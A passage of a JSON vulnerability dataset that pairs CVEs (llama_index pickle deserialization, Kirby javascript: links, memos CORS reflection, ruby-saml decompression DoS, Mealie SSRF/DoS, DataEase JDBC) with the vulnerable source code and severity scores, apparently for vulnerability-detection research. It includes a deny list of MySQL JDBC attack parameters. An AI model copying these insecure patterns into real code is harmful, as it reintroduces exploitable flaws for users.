          "content": "import base64\nimport json\nimport pickle\nfrom abc import ABC, abstractmethod\nfrom typing import Any\nfrom pydantic import BaseModel\n\nfrom llama_index.core.schema import BaseComponent\nfrom .utils import import_module_from_qualified_name, get_qualified_name\n\n\nclass BaseSerializer(ABC):\n    @abstractmethod\n    def serialize(self, value: Any) -> str: ...\n\n    @abstractmethod\n    def deserialize(self, value: str) -> Any: ...\n\n\nclass JsonSerializer(BaseSerializer):\n    def _serialize_value(self, value: Any) -> Any:\n        \"\"\"Helper to serialize a single value.\"\"\"\n        if isinstance(value, BaseComponent):\n            return {\n                \"__is_component\": True,\n                \"value\": value.to_dict(),\n                \"qualified_name\": get_qualified_name(value),\n            }\n        elif isinstance(value, BaseModel):\n            return {\n                \"__is_pydantic\": True,\n                \"value\": value.model_dump(),\n                \"qualified_name\": get_qualified_name(value),\n            }\n        elif isinstance(value, dict):\n            return {k: self._serialize_value(v) for k, v in value.items()}\n        elif isinstance(value, list):\n            return [self._serialize_value(item) for item in value]\n        return value\n\n    def serialize(self, value: Any) -> str:\n        try:\n            serialized_value = self._serialize_value(value)\n            return json.dumps(serialized_value)\n        except Exception as e:\n            raise ValueError(f\"Failed to serialize value: {type(value)}: {value!s}\")\n\n    def _deserialize_value(self, data: Any) -> Any:\n        \"\"\"Helper to deserialize a single value.\"\"\"\n        if isinstance(data, dict):\n            if data.get(\"__is_pydantic\") and data.get(\"qualified_name\"):\n                module_class = import_module_from_qualified_name(data[\"qualified_name\"])\n                return module_class.model_validate(data[\"value\"])\n            elif data.get(\"__is_component\") and data.get(\"qualified_name\"):\n                module_class = import_module_from_qualified_name(data[\"qualified_name\"])\n                return module_class.from_dict(data[\"value\"])\n            return {k: self._deserialize_value(v) for k, v in data.items()}\n        elif isinstance(data, list):\n            return [self._deserialize_value(item) for item in data]\n        return data\n\n    def deserialize(self, value: str) -> Any:\n        data = json.loads(value)\n        return self._deserialize_value(data)\n\n\nclass JsonPickleSerializer(JsonSerializer):\n    def serialize(self, value: Any) -> str:\n        \"\"\"Serialize while prioritizing JSON, falling back to Pickle.\"\"\"\n        try:\n            return super().serialize(value)\n        except Exception:\n            return base64.b64encode(pickle.dumps(value)).decode(\"utf-8\")\n\n    def deserialize(self, value: str) -> Any:\n        \"\"\"Deserialize while prioritizing Pickle, falling back to JSON.\"\"\"\n        try:\n            return pickle.loads(base64.b64decode(value))\n        except Exception:\n            return super().deserialize(value)\n"
        }
      ],
      "method_level": [
        "def deserialize(self, value: str) -> Any:\n        \"\"\"Deserialize while prioritizing Pickle, falling back to JSON.\"\"\"\n        try:\n            return pickle.loads(base64.b64decode(value))\n        except Exception:\n            return super().deserialize(value)"
      ],
      "hunk_level": [
        {
          "line_no": 76,
          "content": "        \"\"\"Deserialize while prioritizing Pickle, falling back to JSON.\"\"\""
        }
      ]
    },
    "cwe": [
      "CWE-1112"
    ],
    "severity": "HIGH",
    "cvss_score": 7.5,
    "cvss_version": 3.1
  },
  {
    "id": 369,
    "cve": "CVE-2024-27087",
    "description": "Kirby is a content management system. The new link field introduced in Kirby 4 allows several different link types that each validate the entered link to the relevant URL format. It also includes a \"Custom\" link type for advanced use cases that don't fit any of the pre-defined link formats.  As the \"Custom\" link type is meant to be flexible, it also allows the javascript: URL scheme. In some use cases this can be intended, but it can also be misused by attackers to execute arbitrary JavaScript code when a user or visitor clicks on a link that is generated from the contents of the link field. This vulnerability is patched in 4.1.1.\n\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "tests/Form/Fields/LinkFieldTest.php",
          "content": "<?php\n\nnamespace Form\\Fields;\n\nuse Kirby\\Form\\Fields\\TestCase;\n\nclass LinkFieldTest extends TestCase\n{\n\tpublic function testDefaultProps()\n\t{\n\t\t$field = $this->field('link');\n\n\t\t$this->assertSame('link', $field->type());\n\t\t$this->assertSame('link', $field->name());\n\t\t$this->assertSame('', $field->value());\n\t\t$this->assertNull($field->label());\n\t\t$this->assertNull($field->text());\n\t\t$this->assertTrue($field->save());\n\t\t$this->assertNull($field->after());\n\t\t$this->assertNull($field->before());\n\t\t$this->assertNull($field->icon());\n\t\t$this->assertNull($field->placeholder());\n\t\t$this->assertSame([\n\t\t\t'url',\n\t\t\t'page',\n\t\t\t'file',\n\t\t\t'email',\n\t\t\t'tel',\n\t\t\t'anchor',\n\t\t\t'custom'\n\t\t], $field->options());\n\t}\n}\n"
        }
      ],
      "method_level": [
        "public function testDefaultProps()\n\t{\n\t\t$field = $this->field('link');\n\n\t\t$this->assertSame('link', $field->type());\n\t\t$this->assertSame('link', $field->name());\n\t\t$this->assertSame('', $field->value());\n\t\t$this->assertNull($field->label());\n\t\t$this->assertNull($field->text());\n\t\t$this->assertTrue($field->save());\n\t\t$this->assertNull($field->after());\n\t\t$this->assertNull($field->before());\n\t\t$this->assertNull($field->icon());\n\t\t$this->assertNull($field->placeholder());\n\t\t$this->assertSame([\n\t\t\t'url',\n\t\t\t'page',\n\t\t\t'file',\n\t\t\t'email',\n\t\t\t'tel',\n\t\t\t'anchor',\n\t\t\t'custom'\n\t\t], $field->options());\n\t}"
      ],
      "hunk_level": [
        {
          "line_no": 29,
          "content": "\t\t\t'anchor',"
        },
        {
          "line_no": 30,
          "content": "\t\t\t'custom'"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.6,
    "cvss_version": 3.1
  },
  {
    "id": 1107,
    "cve": "CVE-2024-41659",
    "description": "memos is a privacy-first, lightweight note-taking service. A CORS misconfiguration exists in memos 0.20.1 and earlier where an arbitrary origin is reflected with Access-Control-Allow-Credentials set to true. This may allow an attacking website to make a cross-origin request, allowing the attacker to read private information or make privileged changes to the system as the vulnerable user account. This vulnerability is fixed in 0.21.0.",
    "vulnerability": {
      "file_level": [
        {
          "name": "server/server.go",
          "content": "package server\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"net/http\"\n\t\"strings\"\n\t\"time\"\n\n\t\"github.com/google/uuid\"\n\t\"github.com/labstack/echo/v4\"\n\t\"github.com/pkg/errors\"\n\n\t\"github.com/usememos/memos/plugin/telegram\"\n\t\"github.com/usememos/memos/server/integration\"\n\t\"github.com/usememos/memos/server/profile\"\n\tapiv1 \"github.com/usememos/memos/server/route/api/v1\"\n\tapiv2 \"github.com/usememos/memos/server/route/api/v2\"\n\t\"github.com/usememos/memos/server/route/frontend\"\n\tversionchecker \"github.com/usememos/memos/server/service/version_checker\"\n\t\"github.com/usememos/memos/store\"\n)\n\ntype Server struct {\n\te *echo.Echo\n\n\tID      string\n\tSecret  string\n\tProfile *profile.Profile\n\tStore   *store.Store\n\n\t// Asynchronous runners.\n\ttelegramBot *telegram.Bot\n}\n\nfunc NewServer(ctx context.Context, profile *profile.Profile, store *store.Store) (*Server, error) {\n\te := echo.New()\n\te.Debug = true\n\te.HideBanner = true\n\te.HidePort = true\n\n\ts := &Server{\n\t\te:       e,\n\t\tStore:   store,\n\t\tProfile: profile,\n\n\t\t// Asynchronous runners.\n\t\ttelegramBot: telegram.NewBotWithHandler(integration.NewTelegramHandler(store)),\n\t}\n\n\t// Register CORS middleware.\n\te.Use(CORSMiddleware())\n\n\tserverID, err := s.getSystemServerID(ctx)\n\tif err != nil {\n\t\treturn nil, errors.Wrap(err, \"failed to retrieve system server ID\")\n\t}\n\ts.ID = serverID\n\n\tsecret := \"usememos\"\n\tif profile.Mode == \"prod\" {\n\t\tsecret, err = s.getSystemSecretSessionName(ctx)\n\t\tif err != nil {\n\t\t\treturn nil, errors.Wrap(err, \"failed to retrieve system secret session name\")\n\t\t}\n\t}\n\ts.Secret = secret\n\n\t// Register healthz endpoint.\n\te.GET(\"/healthz\", func(c echo.Context) error {\n\t\treturn c.String(http.StatusOK, \"Service ready.\")\n\t})\n\n\t// Only serve frontend when it's enabled.\n\tif profile.Frontend {\n\t\tfrontendService := frontend.NewFrontendService(profile, store)\n\t\tfrontendService.Serve(ctx, e)\n\t}\n\n\t// Register API v1 endpoints.\n\trootGroup := e.Group(\"\")\n\tapiV1Service := apiv1.NewAPIV1Service(s.Secret, profile, store, s.telegramBot)\n\tapiV1Service.Register(rootGroup)\n\n\tapiV2Service := apiv2.NewAPIV2Service(s.Secret, profile, store, s.Profile.Port+1)\n\t// Register gRPC gateway as api v2.\n\tif err := apiV2Service.RegisterGateway(ctx, e); err != nil {\n\t\treturn nil, errors.Wrap(err, \"failed to register gRPC gateway\")\n\t}\n\n\treturn s, nil\n}\n\nfunc (s *Server) Start(ctx context.Context) error {\n\tgo versionchecker.NewVersionChecker(s.Store, s.Profile).Start(ctx)\n\tgo s.telegramBot.Start(ctx)\n\treturn s.e.Start(fmt.Sprintf(\"%s:%d\", s.Profile.Addr, s.Profile.Port))\n}\n\nfunc (s *Server) Shutdown(ctx context.Context) {\n\tctx, cancel := context.WithTimeout(ctx, 10*time.Second)\n\tdefer cancel()\n\n\t// Shutdown echo server\n\tif err := s.e.Shutdown(ctx); err != nil {\n\t\tfmt.Printf(\"failed to shutdown server, error: %v\\n\", err)\n\t}\n\n\t// Close database connection\n\tif err := s.Store.Close(); err != nil {\n\t\tfmt.Printf(\"failed to close database, error: %v\\n\", err)\n\t}\n\n\tfmt.Printf(\"memos stopped properly\\n\")\n}\n\nfunc (s *Server) GetEcho() *echo.Echo {\n\treturn s.e\n}\n\nfunc (s *Server) getSystemServerID(ctx context.Context) (string, error) {\n\tserverIDSetting, err := s.Store.GetWorkspaceSetting(ctx, &store.FindWorkspaceSetting{\n\t\tName: apiv1.SystemSettingServerIDName.String(),\n\t})\n\tif err != nil {\n\t\treturn \"\", err\n\t}\n\tif serverIDSetting == nil || serverIDSetting.Value == \"\" {\n\t\tserverIDSetting, err = s.Store.UpsertWorkspaceSetting(ctx, &store.WorkspaceSetting{\n\t\t\tName:  apiv1.SystemSettingServerIDName.String(),\n\t\t\tValue: uuid.NewString(),\n\t\t})\n\t\tif err != nil {\n\t\t\treturn \"\", err\n\t\t}\n\t}\n\treturn serverIDSetting.Value, nil\n}\n\nfunc (s *Server) getSystemSecretSessionName(ctx context.Context) (string, error) {\n\tsecretSessionNameValue, err := s.Store.GetWorkspaceSetting(ctx, &store.FindWorkspaceSetting{\n\t\tName: apiv1.SystemSettingSecretSessionName.String(),\n\t})\n\tif err != nil {\n\t\treturn \"\", err\n\t}\n\tif secretSessionNameValue == nil || secretSessionNameValue.Value == \"\" {\n\t\tsecretSessionNameValue, err = s.Store.UpsertWorkspaceSetting(ctx, &store.WorkspaceSetting{\n\t\t\tName:  apiv1.SystemSettingSecretSessionName.String(),\n\t\t\tValue: uuid.NewString(),\n\t\t})\n\t\tif err != nil {\n\t\t\treturn \"\", err\n\t\t}\n\t}\n\treturn secretSessionNameValue.Value, nil\n}\n\nfunc grpcRequestSkipper(c echo.Context) bool {\n\treturn strings.HasPrefix(c.Request().URL.Path, \"/memos.api.v2.\")\n}\n\nfunc CORSMiddleware() echo.MiddlewareFunc {\n\treturn func(next echo.HandlerFunc) echo.HandlerFunc {\n\t\treturn func(c echo.Context) error {\n\t\t\tif grpcRequestSkipper(c) {\n\t\t\t\treturn next(c)\n\t\t\t}\n\n\t\t\tr := c.Request()\n\t\t\tw := c.Response().Writer\n\n\t\t\tw.Header().Set(\"Access-Control-Allow-Origin\", r.Header.Get(\"Origin\"))\n\t\t\tw.Header().Set(\"Access-Control-Allow-Methods\", \"GET, POST, PUT, DELETE, PATCH, OPTIONS\")\n\t\t\tw.Header().Set(\"Access-Control-Allow-Headers\", \"Content-Type, Authorization\")\n\t\t\tw.Header().Set(\"Access-Control-Allow-Credentials\", \"true\")\n\n\t\t\t// If it's preflight request, return immediately.\n\t\t\tif r.Method == \"OPTIONS\" {\n\t\t\t\tw.WriteHeader(http.StatusOK)\n\t\t\t\treturn nil\n\t\t\t}\n\t\t\treturn next(c)\n\t\t}\n\t}\n}\n"
        }
      ],
      "method_level": [
        "func NewServer(ctx context.Context, profile *profile.Profile, store *store.Store) (*Server, error) {\n\te := echo.New()\n\te.Debug = true\n\te.HideBanner = true\n\te.HidePort = true\n\n\ts := &Server{\n\t\te:       e,\n\t\tStore:   store,\n\t\tProfile: profile,\n\n\t\t// Asynchronous runners.\n\t\ttelegramBot: telegram.NewBotWithHandler(integration.NewTelegramHandler(store)),\n\t}\n\n\t// Register CORS middleware.\n\te.Use(CORSMiddleware())\n\n\tserverID, err := s.getSystemServerID(ctx)\n\tif err != nil {\n\t\treturn nil, errors.Wrap(err, \"failed to retrieve system server ID\")\n\t}\n\ts.ID = serverID\n\n\tsecret := \"usememos\"\n\tif profile.Mode == \"prod\" {\n\t\tsecret, err = s.getSystemSecretSessionName(ctx)\n\t\tif err != nil {\n\t\t\treturn nil, errors.Wrap(err, \"failed to retrieve system secret session name\")\n\t\t}\n\t}\n\ts.Secret = secret\n\n\t// Register healthz endpoint.\n\te.GET(\"/healthz\", func(c echo.Context) error {\n\t\treturn c.String(http.StatusOK, \"Service ready.\")\n\t})\n\n\t// Only serve frontend when it's enabled.\n\tif profile.Frontend {\n\t\tfrontendService := frontend.NewFrontendService(profile, store)\n\t\tfrontendService.Serve(ctx, e)\n\t}\n\n\t// Register API v1 endpoints.\n\trootGroup := e.Group(\"\")\n\tapiV1Service := apiv1.NewAPIV1Service(s.Secret, profile, store, s.telegramBot)\n\tapiV1Service.Register(rootGroup)\n\n\tapiV2Service := apiv2.NewAPIV2Service(s.Secret, profile, store, s.Profile.Port+1)\n\t// Register gRPC gateway as api v2.\n\tif err := apiV2Service.RegisterGateway(ctx, e); err != nil {\n\t\treturn nil, errors.Wrap(err, \"failed to register gRPC gateway\")\n\t}\n\n\treturn s, nil\n}",
        "func CORSMiddleware() echo.MiddlewareFunc {\n\treturn func(next echo.HandlerFunc) echo.HandlerFunc {\n\t\treturn func(c echo.Context) error {\n\t\t\tif grpcRequestSkipper(c) {\n\t\t\t\treturn next(c)\n\t\t\t}\n\n\t\t\tr := c.Request()\n\t\t\tw := c.Response().Writer\n\n\t\t\tw.Header().Set(\"Access-Control-Allow-Origin\", r.Header.Get(\"Origin\"))\n\t\t\tw.Header().Set(\"Access-Control-Allow-Methods\", \"GET, POST, PUT, DELETE, PATCH, OPTIONS\")\n\t\t\tw.Header().Set(\"Access-Control-Allow-Headers\", \"Content-Type, Authorization\")\n\t\t\tw.Header().Set(\"Access-Control-Allow-Credentials\", \"true\")\n\n\t\t\t// If it's preflight request, return immediately.\n\t\t\tif r.Method == \"OPTIONS\" {\n\t\t\t\tw.WriteHeader(http.StatusOK)\n\t\t\t\treturn nil\n\t\t\t}\n\t\t\treturn next(c)\n\t\t}\n\t}\n}"
      ],
      "hunk_level": [
        {
          "line_no": 52,
          "content": "\te.Use(CORSMiddleware())"
        },
        {
          "line_no": 163,
          "content": "func CORSMiddleware() echo.MiddlewareFunc {"
        },
        {
          "line_no": 173,
          "content": "\t\t\tw.Header().Set(\"Access-Control-Allow-Origin\", r.Header.Get(\"Origin\"))"
        }
      ]
    },
    "cwe": [
      "CWE-942"
    ],
    "severity": "HIGH",
    "cvss_score": 8.1,
    "cvss_version": 3.1
  },
  {
    "id": 64,
    "cve": "CVE-2025-25293",
    "description": "ruby-saml provides security assertion markup language (SAML) single sign-on (SSO) for Ruby. Prior to versions 1.12.4 and 1.18.0, ruby-saml is susceptible to remote Denial of Service (DoS) with compressed SAML responses. ruby-saml uses zlib to decompress SAML responses in case they're compressed. It is possible to bypass the message size check with a compressed assertion since the message size is checked before inflation and not after. This issue may lead to remote Denial of Service (DoS). Versions 1.12.4 and 1.18.0 fix the issue.",
    "vulnerability": {
      "file_level": [
        {
          "name": "lib/onelogin/ruby-saml/saml_message.rb",
          "content": "require 'cgi'\nrequire 'zlib'\nrequire 'base64'\nrequire 'nokogiri'\nrequire 'rexml/document'\nrequire 'rexml/xpath'\nrequire \"onelogin/ruby-saml/error_handling\"\n\n# Only supports SAML 2.0\nmodule OneLogin\n  module RubySaml\n\n    # SAML2 Message\n    #\n    class SamlMessage\n      include REXML\n\n      ASSERTION = \"urn:oasis:names:tc:SAML:2.0:assertion\".freeze\n      PROTOCOL  = \"urn:oasis:names:tc:SAML:2.0:protocol\".freeze\n\n      BASE64_FORMAT = %r(\\A([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?\\Z)\n\n      # @return [Nokogiri::XML::Schema] Gets the schema object of the SAML 2.0 Protocol schema\n      #\n      def self.schema\n        path = File.expand_path(\"../../../schemas/saml-schema-protocol-2.0.xsd\", __FILE__)\n        File.open(path) do |file|\n          ::Nokogiri::XML::Schema(file)\n        end\n      end\n\n      # @return [String|nil] Gets the Version attribute from the SAML Message if exists.\n      #\n      def version(document)\n        @version ||= begin\n          node = REXML::XPath.first(\n            document,\n            \"/p:AuthnRequest | /p:Response | /p:LogoutResponse | /p:LogoutRequest\",\n            { \"p\" => PROTOCOL }\n          )\n          node.nil? ? nil : node.attributes['Version']\n        end\n      end\n\n      # @return [String|nil] Gets the ID attribute from the SAML Message if exists.\n      #\n      def id(document)\n        @id ||= begin\n          node = REXML::XPath.first(\n            document,\n            \"/p:AuthnRequest | /p:Response | /p:LogoutResponse | /p:LogoutRequest\",\n            { \"p\" => PROTOCOL }\n          )\n          node.nil? ? nil : node.attributes['ID']\n        end\n      end\n\n      # Validates the SAML Message against the specified schema.\n      # @param document [REXML::Document] The message that will be validated\n      # @param soft [Boolean] soft Enable or Disable the soft mode (In order to raise exceptions when the message is invalid or not)\n      # @return [Boolean] True if the XML is valid, otherwise False, if soft=True\n      # @raise [ValidationError] if soft == false and validation fails\n      #\n      def valid_saml?(document, soft = true)\n        begin\n          xml = Nokogiri::XML(document.to_s) do |config|\n            config.options = XMLSecurity::BaseDocument::NOKOGIRI_OPTIONS\n          end\n        rescue StandardError => error\n          return false if soft\n          raise ValidationError.new(\"XML load failed: #{error.message}\")\n        end\n\n        SamlMessage.schema.validate(xml).map do |schema_error|\n          return false if soft\n          raise ValidationError.new(\"#{schema_error.message}\\n\\n#{xml}\")\n        end\n      end\n\n      private\n\n      # Base64 decode and try also to inflate a SAML Message\n      # @param saml [String] The deflated and encoded SAML Message\n      # @return [String] The plain SAML Message\n      #\n      def decode_raw_saml(saml, settings = nil)\n        return saml unless base64_encoded?(saml)\n\n        settings = OneLogin::RubySaml::Settings.new if settings.nil?\n        if saml.bytesize > settings.message_max_bytesize\n          raise ValidationError.new(\"Encoded SAML Message exceeds \" + settings.message_max_bytesize.to_s + \" bytes, so was rejected\")\n        end\n\n        decoded = decode(saml)\n        begin\n          inflate(decoded)\n        rescue\n          decoded\n        end\n      end\n\n      # Deflate, base64 encode and url-encode a SAML Message (To be used in the HTTP-redirect binding)\n      # @param saml [String] The plain SAML Message\n      # @param settings [OneLogin::RubySaml::Settings|nil] Toolkit settings\n      # @return [String] The deflated and encoded SAML Message (encoded if the compression is requested)\n      #\n      def encode_raw_saml(saml, settings)\n        saml = deflate(saml) if settings.compress_request\n\n        CGI.escape(encode(saml))\n      end\n\n      # Base 64 decode method\n      # @param string [String] The string message\n      # @return [String] The decoded string\n      #\n      def decode(string)\n        Base64.decode64(string)\n      end\n\n      # Base 64 encode method\n      # @param string [String] The string\n      # @return [String] The encoded string\n      #\n      def encode(string)\n        if Base64.respond_to?('strict_encode64')\n          Base64.strict_encode64(string)\n        else\n          Base64.encode64(string).gsub(/\\n/, \"\")\n        end\n      end\n\n      # Check if a string is base64 encoded\n      # @param string [String] string to check the encoding of\n      # @return [true, false] whether or not the string is base64 encoded\n      #\n      def base64_encoded?(string)\n        !!string.gsub(/[\\r\\n]|\\\\r|\\\\n|\\s/, \"\").match(BASE64_FORMAT)\n      end\n\n      # Inflate method\n      # @param deflated [String] The string\n      # @return [String] The inflated string\n      #\n      def inflate(deflated)\n        Zlib::Inflate.new(-Zlib::MAX_WBITS).inflate(deflated)\n      end\n\n      # Deflate method\n      # @param inflated [String] The string\n      # @return [String] The deflated string\n      #\n      def deflate(inflated)\n        Zlib::Deflate.deflate(inflated, 9)[2..-5]\n      end\n    end\n  end\nend\n"
        }
      ],
      "method_level": [
        "def decode_raw_saml(saml, settings = nil)\n        return saml unless base64_encoded?(saml)\n\n        settings = OneLogin::RubySaml::Settings.new if settings.nil?\n        if saml.bytesize > settings.message_max_bytesize\n          raise ValidationError.new(\"Encoded SAML Message exceeds \" + settings.message_max_bytesize.to_s + \" bytes, so was rejected\")\n        end\n\n        decoded = decode(saml)\n        begin\n          inflate(decoded)\n        rescue\n          decoded\n        end\n      end"
      ],
      "hunk_level": [
        {
          "line_no": 96,
          "content": "          inflate(decoded)"
        },
        {
          "line_no": 98,
          "content": "          decoded"
        }
      ]
    },
    "cwe": [
      "CWE-400"
    ],
    "severity": "HIGH",
    "cvss_score": 7.7,
    "cvss_version": 4.0
  },
  {
    "id": 694,
    "cve": "CVE-2024-31992",
    "description": "Mealie is a self hosted recipe manager and meal planner. Prior to 1.4.0, the safe_scrape_html function utilizes a user-controlled URL to issue a request to a remote server, however these requests are not rate-limited. While there are efforts to prevent DDoS by implementing a timeout on requests, it is possible for an attacker to issue a large number of requests to the server which will be handled in batches based on the configuration of the Mealie server. The chunking of responses is helpful for mitigating memory exhaustion on the Mealie server, however a single request to an arbitrarily large external file (e.g. a Debian ISO) is often sufficient to completely saturate a CPU core assigned to the Mealie container. Without rate limiting in place, it is possible to not only sustain traffic against an external target indefinitely, but also to exhaust the CPU resources assigned to the Mealie container. This vulnerability is fixed in 1.4.0.",
    "vulnerability": {
      "file_level": [
        {
          "name": "mealie/services/recipe/recipe_data_service.py",
          "content": "import asyncio\nimport shutil\nfrom pathlib import Path\n\nfrom httpx import AsyncClient, Response\nfrom pydantic import UUID4\n\nfrom mealie.pkgs import img\nfrom mealie.schema.recipe.recipe import Recipe\nfrom mealie.services._base_service import BaseService\n\n_FIREFOX_UA = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0\"\n\n\nasync def gather_with_concurrency(n, *coros, ignore_exceptions=False):\n    semaphore = asyncio.Semaphore(n)\n\n    async def sem_coro(coro):\n        async with semaphore:\n            return await coro\n\n    results = await asyncio.gather(*(sem_coro(c) for c in coros), return_exceptions=ignore_exceptions)\n    if ignore_exceptions:\n        results = [r for r in results if not isinstance(r, Exception)]\n    return results\n\n\nasync def largest_content_len(urls: list[str]) -> tuple[str, int]:\n    largest_url = \"\"\n    largest_len = 0\n\n    async def do(client: AsyncClient, url: str) -> Response:\n        return await client.head(url, headers={\"User-Agent\": _FIREFOX_UA})\n\n    async with AsyncClient() as client:\n        tasks = [do(client, url) for url in urls]\n        responses: list[Response] = await gather_with_concurrency(10, *tasks, ignore_exceptions=True)\n        for response in responses:\n            len_int = int(response.headers.get(\"Content-Length\", 0))\n            if len_int > largest_len:\n                largest_url = str(response.url)\n                largest_len = len_int\n\n    return largest_url, largest_len\n\n\nclass NotAnImageError(Exception):\n    pass\n\n\nclass InvalidDomainError(Exception):\n    pass\n\n\nclass RecipeDataService(BaseService):\n    minifier: img.ABCMinifier\n\n    def __init__(self, recipe_id: UUID4, group_id: UUID4 | None = None) -> None:\n        \"\"\"\n        RecipeDataService is a service that consolidates the reading/writing actions related\n        to assets, and images for a recipe.\n        \"\"\"\n        super().__init__()\n\n        self.recipe_id = recipe_id\n        self.slug = group_id\n        self.minifier = img.PillowMinifier(purge=True, logger=self.logger)\n\n        self.dir_data = Recipe.directory_from_id(self.recipe_id)\n        self.dir_image = self.dir_data.joinpath(\"images\")\n        self.dir_image_timeline = self.dir_image.joinpath(\"timeline\")\n        self.dir_assets = self.dir_data.joinpath(\"assets\")\n\n        for dir in [self.dir_image, self.dir_image_timeline, self.dir_assets]:\n            dir.mkdir(parents=True, exist_ok=True)\n\n    def delete_all_data(self) -> None:\n        try:\n            shutil.rmtree(self.dir_data)\n        except Exception as e:\n            self.logger.exception(f\"Failed to delete recipe data: {e}\")\n\n    def write_image(self, file_data: bytes | Path, extension: str, image_dir: Path | None = None) -> Path:\n        if not image_dir:\n            image_dir = self.dir_image\n\n        extension = extension.replace(\".\", \"\")\n        image_path = image_dir.joinpath(f\"original.{extension}\")\n        image_path.unlink(missing_ok=True)\n\n        if isinstance(file_data, Path):\n            shutil.copy2(file_data, image_path)\n        elif isinstance(file_data, bytes):\n            with open(image_path, \"ab\") as f:\n                f.write(file_data)\n        else:\n            with open(image_path, \"ab\") as f:\n                shutil.copyfileobj(file_data, f)\n\n        self.minifier.minify(image_path)\n\n        return image_path\n\n    @staticmethod\n    def _validate_image_url(url: str) -> bool:\n        # sourcery skip: invert-any-all, use-any\n        \"\"\"\n        Validates that the URL is of an allowed source and restricts certain sources to prevent\n        malicious images from being downloaded.\n        \"\"\"\n        invalid_domains = {\"127.0.0.1\", \"localhost\"}\n        for domain in invalid_domains:\n            if domain in url:\n                return False\n\n        return True\n\n    async def scrape_image(self, image_url) -> None:\n        self.logger.info(f\"Image URL: {image_url}\")\n\n        if not self._validate_image_url(image_url):\n            self.logger.error(f\"Invalid image URL: {image_url}\")\n            raise InvalidDomainError(f\"Invalid domain: {image_url}\")\n\n        if isinstance(image_url, str):  # Handles String Types\n            pass\n\n        elif isinstance(image_url, list):  # Handles List Types\n            # Multiple images have been defined in the schema - usually different resolutions\n            # Typically would be in smallest->biggest order, but can't be certain so test each.\n            # 'Google will pick the best image to display in Search results based on the aspect ratio and resolution.'\n            image_url, _ = await largest_content_len(image_url)\n\n        elif isinstance(image_url, dict):  # Handles Dictionary Types\n            for key in image_url:\n                if key == \"url\":\n                    image_url = image_url.get(\"url\")\n\n        ext = image_url.split(\".\")[-1]\n\n        if ext not in img.IMAGE_EXTENSIONS:\n            ext = \"jpg\"  # Guess the extension\n\n        file_name = f\"{str(self.recipe_id)}.{ext}\"\n        file_path = Recipe.directory_from_id(self.recipe_id).joinpath(\"images\", file_name)\n\n        async with AsyncClient() as client:\n            try:\n                r = await client.get(image_url, headers={\"User-Agent\": _FIREFOX_UA})\n            except Exception:\n                self.logger.exception(\"Fatal Image Request Exception\")\n                return None\n\n            if r.status_code != 200:\n                # TODO: Probably should throw an exception in this case as well, but before these changes\n                # we were returning None if it failed anyways.\n                return None\n\n            content_type = r.headers.get(\"content-type\", \"\")\n\n            if \"image\" not in content_type:\n                self.logger.error(f\"Content-Type: {content_type} is not an image\")\n                raise NotAnImageError(f\"Content-Type {content_type} is not an image\")\n\n            self.logger.debug(f\"File Name Suffix {file_path.suffix}\")\n            self.write_image(r.read(), file_path.suffix)\n            file_path.unlink(missing_ok=True)\n"
        }
      ],
      "method_level": [
        "def _validate_image_url(url: str) -> bool:\n        # sourcery skip: invert-any-all, use-any\n        \"\"\"\n        Validates that the URL is of an allowed source and restricts certain sources to prevent\n        malicious images from being downloaded.\n        \"\"\"\n        invalid_domains = {\"127.0.0.1\", \"localhost\"}\n        for domain in invalid_domains:\n            if domain in url:\n                return False\n\n        return True"
      ],
      "hunk_level": [
        {
          "line_no": 105,
          "content": "    def _validate_image_url(url: str) -> bool:"
        },
        {
          "line_no": 106,
          "content": "        # sourcery skip: invert-any-all, use-any"
        },
        {
          "line_no": 107,
          "content": "        \"\"\""
        },
        {
          "line_no": 108,
          "content": "        Validates that the URL is of an allowed source and restricts certain sources to prevent"
        },
        {
          "line_no": 109,
          "content": "        malicious images from being downloaded."
        },
        {
          "line_no": 110,
          "content": "        \"\"\""
        },
        {
          "line_no": 111,
          "content": "        invalid_domains = {\"127.0.0.1\", \"localhost\"}"
        },
        {
          "line_no": 112,
          "content": "        for domain in invalid_domains:"
        },
        {
          "line_no": 113,
          "content": "            if domain in url:"
        },
        {
          "line_no": 114,
          "content": "                return False"
        },
        {
          "line_no": 116,
          "content": "        return True"
        }
      ]
    },
    "cwe": [
      "CWE-770",
      "CWE-400"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 402,
    "cve": "CVE-2024-23328",
    "description": "Dataease is an open source data visualization analysis tool. A deserialization vulnerability exists in the DataEase datasource, which can be exploited to execute arbitrary code. The location of the vulnerability code is `core/core-backend/src/main/java/io/dataease/datasource/type/Mysql.java.` The blacklist of mysql jdbc attacks can be bypassed and attackers can further exploit it for deserialized execution or reading arbitrary files. This vulnerability is patched in 1.18.15 and 2.3.0.",
    "vulnerability": {
      "file_level": [
        {
          "name": "core/backend/src/main/java/io/dataease/dto/datasource/MysqlConfiguration.java",
          "content": "package io.dataease.dto.datasource;\n\nimport io.dataease.plugins.datasource.entity.JdbcConfiguration;\nimport lombok.Getter;\nimport lombok.Setter;\nimport org.apache.commons.lang3.StringUtils;\n\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.List;\n\n@Getter\n@Setter\npublic class MysqlConfiguration extends JdbcConfiguration {\n\n    private String driver = \"com.mysql.jdbc.Driver\";\n    private String extraParams = \"characterEncoding=UTF-8&connectTimeout=5000&useSSL=false&allowPublicKeyRetrieval=true&zeroDateTimeBehavior=convertToNull\";\n    private List<String> illegalParameters = Arrays.asList(\"autoDeserialize\", \"queryInterceptors\", \"statementInterceptors\", \"detectCustomCollations\", \"allowloadlocalinfile\", \"allowUrlInLocalInfile\", \"allowLoadLocalInfileInPath\");\n\n    public String getJdbc() {\n        if (StringUtils.isEmpty(extraParams.trim())) {\n            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE\".replace(\"HOSTNAME\", getHost().trim()).replace(\"PORT\", getPort().toString().trim()).replace(\"DATABASE\", getDataBase().trim());\n        } else {\n            for (String illegalParameter : getIllegalParameters()) {\n                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase())) {\n                    throw new RuntimeException(\"Illegal parameter: \" + illegalParameter);\n                }\n            }\n\n            return 